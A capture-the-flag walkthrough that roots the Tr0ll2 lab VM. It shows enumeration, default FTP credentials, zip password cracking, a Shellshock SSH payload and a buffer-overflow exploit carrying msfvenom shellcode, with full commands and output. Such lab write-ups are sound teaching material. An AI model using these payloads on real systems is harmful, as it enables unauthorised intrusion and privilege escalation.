```
IP=192.168.56.102
```
## Nmap Results
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ nmap -A -sV -sT -p- $IP
PORT   STATE SERVICE VERSION
<font color=red>21</font>/tcp open  ftp     vsftpd <font color=red>2.0.8</font> or later
<font color=red>22</font>/tcp open  ssh     OpenSSH <font color=red>5.9p1</font> Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
<font color=red>80</font>/tcp open  http    Apache httpd <font color=red>2.2.22</font> ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
</pre>

## Port 80 (HTTP)
`robots.txt` contains a list of files. Some of them are valid but some of them are not. 

![](../../Assets/images/tr0ll2-img1.png)

We could automate the checking process with `wfuzz` by ignoring the result with 404 error code. I copy the content of `robots.txt` and put it in a new file called `files.txt` and use that as a wordlist for `wfuzz`.

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ wfuzz -c -z file,files.txt --hc 404 -u http://$IP/FUZZ
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   301        9 L      28 W       315 Ch      "/noob"
000000017:   301        9 L      28 W       324 Ch      "/ok_this_is_it"
000000014:   301        9 L      28 W       322 Ch      "/dont_bother"
000000004:   301        9 L      28 W       322 Ch      "/keep_trying"
</pre>

The four files contains the same cat image. We could download all them for further inspection.

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ for i in {1..4}; do
FILE=`sed -n ${i}p files.txt`<font color=gray> # read each line in files.txt which contains the 'payload'</font>
wget "http://192.168.56.104/$FILE/cat_the_troll.jpg" -O "img$i";
done
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ md5sum img*
8e40e4bf4212b317788de52381072cd8  img1
8e40e4bf4212b317788de52381072cd8  img2
<b>f094e16de91dae231812a2fb382d8803  img3</b>
8e40e4bf4212b317788de52381072cd8  img4
</pre>
All of them is the same except for `img3`.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ strings img3
..SNIP..
7U      4
]=%em;
lj\p
*/ p?E$
Look Deep within<font color=red> <b>y0ur_self</b> </font>for the answer
</pre>
Inspection using `strings` reveals a secret message. If we visit  /y0ur_self directory, there's a single file called `answer.txt`.

![](../../Assets/images/tr0ll2-img2.png)

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ wget http://192.168.56.104/y0ur_self/answer.txt
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ cat answer.txt | head
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
</pre>
It contains a list of strings in base64.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ base64 -d answer.txt > decoded.txt
</pre>
I store the decoded files to a text file called `decoded.txt`. It might be useful later as a wordlist or something.

## Port 21 (FTP)
We can apparently login to FTP using the default credential `tr0ll` as both the username and password. The server seems to only have one file called `lmao.zip`. Let's transfer that to our machine.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ ftp 192.168.56.104
ftp> ls
-rw-r--r--    1 0        0            1474 Oct 04  2014 <b>lmao.zip</b>
ftp> get lmao.zip
ftp> exit
</pre>
The zip file is password protected. We can try to perform a dictionary attack with `john` using the previous decoded base64 file as the wordlist.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ zip2john lmao.zip > lmao.hash
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ sudo john --wordlist=decoded.txt lmao.hash
<font color=red><b>ItCantReallyBeThisEasyRightLOL</b></font> (lmao.zip/noob)
</pre>
Unzipping `lmao.zip` using the password above spits out a private key. We can use that to `ssh` into the server.

## Port 22 (SSH)
Apparently, it wasn't that easy.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ ssh noob@192.168.56.101 -i noob /bin/sh
TRY HARDER LOL!
</pre>
We can SSH into the server BUT as soon as we logged in, we got kicked out somehow.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ ssh noob@192.168.56.101 -i noob -vv
..SNIP..
debug1: channel 0: new [client-session]
debug2: channel 0: send open
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: filesystem
<b>debug1: Remote: Forced command.</b>
debug2: channel_input_open_confirmation: channel 0: callback start
debug2: fd 3 setting TCP_NODELAY
..SNIP..
</pre>
Looking at the debug message, the SSH is configured with [forced commad](https://ctrlnotes.com/restrict-a-user-to-ssh-forced-command/#) which forces a fix command to execute everytime we logged into the server. In this case, the machine echoed the message 'TRY HARDER LOL!'.

We can use the Shellshock exploit to bypass this and get code execution. 

A single command that we execute in SSH is stored in an environment variable called `SSH_ORIGINAL_COMMAND`. We can inject it using shellshock so that we can execute our payload in the environment variable before the forced command is run.

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ ssh noob@192.168.56.102 -i noob "() { :; }; echo MALICIOUS CODE"
MALICIOUS CODE
TRY HARDER LOL!
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ ssh noob@192.168.56.102 -i noob "() { :; }; /bin/sh"
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
</pre>
Let's delete the forced command in `authorized_keys` so we can SSH normally.
<pre style="font-size: 12px";>
$ cat authorized_keys
command="echo TRY HARDER LOL!" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2" > authorized_keys
$ exit
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ ssh noob@192.168.56.102 -i noob
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Oct  5 22:44:47 2014 from 10.0.0.12
noob@Tr0ll2:~$
</pre>
Now we get a normal interactive shell. 
<pre style="font-size: 12px";>
noob@Tr0ll2:/$ cd /
noob@Tr0ll2:/$ ls
bin  boot  dev  etc  home  initrd.img  lib  lost+found  media  mnt  <b>nothing_to_see_here</b>  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
noob@Tr0ll2:/$ cd nothing_to_see_here/
noob@Tr0ll2:/nothing_to_see_here$ cd choose_wisely/
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls
door1  door2  door3
..SNIP..
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
Broadcast message from noob@Tr0ll2
        (/dev/pts/0) at 10:11 ...

The system is going down for reboot NOW!
Connection to 192.168.56.102 closed by remote host.
Connection to 192.168.56.102 closed.
..SSH BACK..
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t

2 MINUTE HARD MODE LOL
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ls
-bash: /bin/ls: Permission denied
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t
Usage: ./r00t input
</pre>
So we have three binary files that can (A) restart the machine, (B) disable `ls` and (C) print any string we give as input.

Since all of them has SUID, this seems to be a buffer overflow scenario. We need to spawn a shell from within the third binary so we can get a root shell.

Inspecting the binary using `checksec`, it seems that the it has minimum security.

![](../../Assets/images/tr0ll2-img3.png)

The machine also disables ASLR. That's nice.
<pre style="font-size: 12px";>
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ cat /proc/sys/kernel/randomize_va_space
0
</pre>
Let's look into the file.
<pre style="font-size: 12px";>
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ gdb r00t
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     and    esp,0xfffffff0
   0x0804844a <+6>:     sub    esp,0x110 -> allocates 272 bytes
   0x08048450 <+12>:    cmp    DWORD PTR [ebp+0x8],0x1
   0x08048454 <+16>:    jne    0x8048478 <main+52>
   0x08048456 <+18>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048459 <+21>:    mov    edx,DWORD PTR [eax]
   0x0804845b <+23>:    mov    eax,0x8048580
   0x08048460 <+28>:    mov    DWORD PTR [esp+0x4],edx
   0x08048464 <+32>:    mov    DWORD PTR [esp],eax
   0x08048467 <+35>:    call   0x8048340 <printf@plt>
   0x0804846c <+40>:    mov    DWORD PTR [esp],0x0
   0x08048473 <+47>:    call   0x8048370 <exit@plt>
   0x08048478 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804847b <+55>:    add    eax,0x4
   0x0804847e <+58>:    mov    eax,DWORD PTR [eax]
   0x08048480 <+60>:    mov    DWORD PTR [esp+0x4],eax
   0x08048484 <+64>:    lea    eax,[esp+0x10]
   0x08048488 <+68>:    mov    DWORD PTR [esp],eax
   0x0804848b <+71>:    call   0x8048350 <strcpy@plt>
   0x08048490 <+76>:    mov    eax,0x8048591
   0x08048495 <+81>:    lea    edx,[esp+0x10]
   0x08048499 <+85>:    mov    DWORD PTR [esp+0x4],edx
   0x0804849d <+89>:    mov    DWORD PTR [esp],eax
   0x080484a0 <+92>:    call   0x8048340 <printf@plt>
   0x080484a5 <+97>:    leave
   0x080484a6 <+98>:    ret
End of assembler dump.
</pre>
It allocates 272  bytes to the stack. So let's create a pattern with size 300.
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ pattern_create -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
</pre>

<pre style="font-size: 12px";>
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
<b>0x6a413969</b> in ?? ()
</pre>

<pre style="font-size: 12px";>
┌─(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ pattern_offset -q 0x6a413969
[*] Exact match at offset 268
</pre>
Great, we get a match at 268. Now we need to find a memory location to fallback into during runtime so it can execute the shellcode. 
<pre style="font-size: 12px";>
(gdb) run $(python -c 'print "A"*268 + "AAAA"')
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A"*268 + "AAAA"')

Program received signal SIGSEGV, Segmentation fault.
<b>0x41414141</b> in ?? ()
(gdb) x/200wx $esp
..SNIP..
0xbffffd10:     0x6f68632f      0x5f65736f      0x65736977      0x642f796c
0xbffffd20:     0x32726f6f      0x3030722f      0x41410074      0x41414141
0xbffffd30:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd40:     0x41414141      0x41414141      0x41414141      0x41414141
<b>0xbffffd50</b>:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd60:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd70:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd80:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd90:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffda0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffdb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffdc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffdd0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffde0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffdf0:     0x41414141      0x41414141      0x41414141      0x41414141
..SNIP..
</pre>

0xbffffd50 seems fair. Now let's generate the payload using `msfvenom`.

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/tr0ll/tr0ll2]
└─$ msfvenom --platform linux --arch x86 --payload linux/x86/exec CMD="/bin/sh" --format python --encoder x86/shikata_ga_nai -b '\x00\x0a\x0d'
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of python file: 357 bytes
buf =  b""
buf += b"\xba\xfb\xe0\x35\x90\xd9\xed\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x0b\x31\x57\x15\x83\xc7\x04\x03\x57\x11\xe2"
buf += b"\x0e\x8a\x3e\xc8\x69\x19\x27\x80\xa4\xfd\x2e\xb7\xde"
buf += b"\x2e\x42\x50\x1e\x59\x8b\xc2\x77\xf7\x5a\xe1\xd5\xef"
buf += b"\x55\xe6\xd9\xef\x4a\x84\xb0\x81\xbb\x3b\x2a\x5e\x93"
buf += b"\xe8\x23\xbf\xd6\x8f"
</pre>

Combining all of the above our full payload should look like this,
```
NOP (198 bytes) + SHELLCODE (70 bytes) + POINTER (4 bytes) = 272 bytes
```
```
./r00t $(python -c 'print "A"*198 + "\xba\xfb\xe0\x35\x90\xd9\xed\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x0b\x31\x57\x15\x83\xc7\x04\x03\x57\x11\xe2\x0e\x8a\x3e\xc8\x69\x19\x27\x80\xa4\xfd\x2e\xb7\xde\x2e\x42\x50\x1e\x59\x8b\xc2\x77\xf7\x5a\xe1\xd5\xef\x55\xe6\xd9\xef\x4a\x84\xb0\x81\xbb\x3b\x2a\x5e\x93\xe8\x23\xbf\xd6\x8f" + "\x50\xfd\xff\xbf"')
```
![](../../Assets/images/tr0ll2-img4.png)
![](../../Assets/images/tr0ll2-img5.png)

## Resources
1. https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh
2. https://github.com/jeholliday/shellshock